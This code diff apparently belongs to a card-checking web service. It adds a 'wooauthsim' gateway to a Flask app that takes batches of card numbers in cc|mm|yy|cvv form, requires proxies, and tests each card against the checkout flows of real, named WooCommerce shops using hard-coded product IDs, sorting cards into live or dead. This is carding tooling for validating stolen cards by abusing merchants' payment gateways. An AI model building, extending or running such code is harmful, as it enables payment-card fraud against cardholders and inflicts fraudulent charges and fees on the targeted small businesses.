@@ -29,6 +29,21 @@ from gateways.b3mageuk   import check_b3mageuk
 from gateways.b3woo      import check_b3woo
 from gateways.ppcp       import check_ppcp
 from gateways.pymntpl    import check_pymntpl
+from gateways.wooauth_sim import SiteConfig, check_wooauth_sim
+
+# ── Per-domain config map for wooauthsim gateway ─────────────────────────────
+_WOOAUTHSIM_CFGS: dict[str, SiteConfig] = {
+    "aronicadiffuser.com": SiteConfig(
+        base_url    = "https://aronicadiffuser.com",
+        product_ids = [5117, 4698, 9537, 5123],
+        shop_path   = "/shop/",
+    ),
+    "artbyjodiarias.com": SiteConfig(
+        base_url    = "https://artbyjodiarias.com",
+        product_ids = [1625, 1227, 1674, 5190],
+        shop_path   = "/store/",
+    ),
+}
 from gateways.utils      import (
     build_plain_session,
     build_session_from_str,
@@ -107,15 +122,16 @@ _TOKEN_LOCK = threading.Lock()
 # Domains that produced a definitive result (live or dead, NOT unknown) are
 # saved per gateway and used as the default list when the domain field is empty.
 WORKING_SITES_FILES = {
-    "authnet":   "data/authnet.txt",
-    "ppcp":      "data/ppcp.txt",
-    "pymntpl":   "data/pymntpl.txt",
-    "b3magento": "data/b3magento.txt",
-    "b3magus":   "data/b3magus.txt",
-    "b3mageuk":  "data/b3mageuk.txt",
-    "b3woo":     "data/b3woo.txt",
+    "authnet":     "data/authnet.txt",
+    "ppcp":        "data/ppcp.txt",
+    "pymntpl":     "data/pymntpl.txt",
+    "b3magento":   "data/b3magento.txt",
+    "b3magus":     "data/b3magus.txt",
+    "b3mageuk":    "data/b3mageuk.txt",
+    "b3woo":       "data/b3woo.txt",
+    "wooauthsim":  "data/wooauth_sim.txt",
 }
-_WORKING_SITES: dict[str, set] = {"authnet": set(), "ppcp": set(), "pymntpl": set(), "b3magento": set(), "b3magus": set(), "b3mageuk": set(), "b3woo": set()}
+_WORKING_SITES: dict[str, set] = {"authnet": set(), "ppcp": set(), "pymntpl": set(), "b3magento": set(), "b3magus": set(), "b3mageuk": set(), "b3woo": set(), "wooauthsim": set()}
 _SITES_LOCK = threading.Lock()
 
 
@@ -255,6 +271,7 @@ def _scan_worker(
     client_token: str,
     gateway:      str = "authnet",
     user_proxy:   str = "",
+    site_cfgs:    dict = None,  # wooauthsim: domain → SiteConfig
 ) -> None:
     try:
         job = JOBS[job_id]
@@ -292,8 +309,16 @@ def _scan_worker(
                     sess = build_session_from_str(user_proxy)
                 else:
                     sess = build_plain_session()
+                # ── wooauthsim: look up config from per-job map, then global map,
+                #    then build a minimal config with auto-discovery fallback ──
                 try:
-                    if gateway == "ppcp":
+                    if gateway == "wooauthsim":
+                        cfg = (site_cfgs or {}).get(domain) or _WOOAUTHSIM_CFGS.get(domain)
+                        if cfg is None:
+                            cfg = SiteConfig(base_url=f"https://{domain}", product_ids=[])
+                        result = check_wooauth_sim(sess, card_tuple, cfg, max_retries=1)
+                        result["domain"] = cfg.base_url.replace("https://", "").replace("http://", "").rstrip("/")
+                    elif gateway == "ppcp":
                         result = check_ppcp(sess, domain, card_tuple)
                     elif gateway == "pymntpl":
                         result = check_pymntpl(sess, domain, card_tuple)
@@ -321,7 +346,7 @@ def _scan_worker(
                 finally:
                     sess.close()
 
-                result["domain"] = domain
+                result["domain"] = result.get("domain") or domain
 
                 # First-attempt structural error → mark domain bad, retry on a good domain
                 if result["status"] == "unknown" and attempt == 0 and _is_bad_site_error(result["message"]):
@@ -475,8 +500,11 @@ def scan():
 
     user_proxy = str(data.get("proxy",   "") or "").strip()
     gateway    = str(data.get("gateway", "authnet") or "authnet").strip().lower()
-    if gateway not in ("authnet", "ppcp", "pymntpl", "b3magento", "b3magus", "b3mageuk", "b3woo"):
+    if gateway not in ("authnet", "ppcp", "pymntpl", "b3magento", "b3magus", "b3mageuk", "b3woo", "wooauthsim"):
         gateway = "authnet"
+
+    if gateway == "wooauthsim" and not user_proxy:
+        return jsonify({"error": "Proxy is required for WOOAUTH SIM."}), 400
 
     # Parse cards: cc|mm|yy[|cvv]
     def parse_card(line: str):
@@ -489,15 +517,37 @@ def scan():
     cards   = [c for c in (parse_card(l) for l in lines_c) if c]
 
     lines_d = raw_domains if isinstance(raw_domains, list) else str(raw_domains).splitlines()
-    domains: list[str] = []
+    domains:   list[str] = []
+    site_cfgs: dict      = {}  # wooauthsim: domain → SiteConfig (built per-request)
+
     for _line in lines_d:
         _line = _line.strip()
         if not _line:
             continue
-        _d = _line.split("|")[0].strip()   # ignore legacy product_id suffix
-        _d = parse_domain(_d)
-        if _d:
-            domains.append(_d)
+        # Support optional product-ID suffix: domain.com|pid1,pid2
+        _parts = [p.strip() for p in _line.split("|")]
+        _d = parse_domain(_parts[0])
+        if not _d:
+            continue
+        domains.append(_d)
+        if gateway == "wooauthsim":
+            if _d in _WOOAUTHSIM_CFGS:
+                site_cfgs[_d] = _WOOAUTHSIM_CFGS[_d]
+            elif len(_parts) > 1:
+                # Caller supplied product IDs: domain.com|123,456
+                pids = [int(p) for p in _parts[1].split(",") if p.strip().isdigit()]
+                site_cfgs[_d] = SiteConfig(
+                    base_url    = f"https://{_d}",
+                    product_ids = pids,
+                    shop_path   = "/shop/",
+                )
+            else:
+                # Unknown domain, no PIDs — auto-discover at check time
+                site_cfgs[_d] = SiteConfig(
+                    base_url    = f"https://{_d}",
+                    product_ids = [],
+                    shop_path   = "/shop/",
+                )
 
     if not cards:
         return jsonify({"error": "No valid cards. Format: cc|mm|yy|cvv"}), 400
@@ -505,11 +555,16 @@ def scan():
     if len(cards) > MAX_CARDS:
         return jsonify({"error": f"Too many cards. Maximum is {MAX_CARDS} per scan."}), 400
     if not domains:
-        # Fall back to saved working sites for the selected gateway
-        with _SITES_LOCK:
-            domains = list(_WORKING_SITES.get(gateway, set()))
-        if not domains:
-            return jsonify({"error": f"No domains provided and no saved {gateway.upper()} sites yet. Paste at least one domain."}), 400
+        if gateway == "wooauthsim":
+            # No domains typed — fall back to all pre-configured sites
+            domains   = list(_WOOAUTHSIM_CFGS.keys())
+            site_cfgs = dict(_WOOAUTHSIM_CFGS)
+        else:
+            # Fall back to saved working sites for the selected gateway
+            with _SITES_LOCK:
+                domains = list(_WORKING_SITES.get(gateway, set()))
+            if not domains:
+                return jsonify({"error": f"No domains provided and no saved {gateway.upper()} sites yet. Paste at least one domain."}), 400
 
     # Per-session rate limit — one active scan per browser session token
     client_token = str(data.get("client_token", "") or "").strip()[:64]
@@ -546,7 +601,7 @@ def scan():
 
     threading.Thread(
         target=_scan_worker,
-        args=(job_id, cards, domains, num_threads, client_token, gateway, user_proxy),
+        args=(job_id, cards, domains, num_threads, client_token, gateway, user_proxy, site_cfgs),
         daemon=True,
     ).start()
 
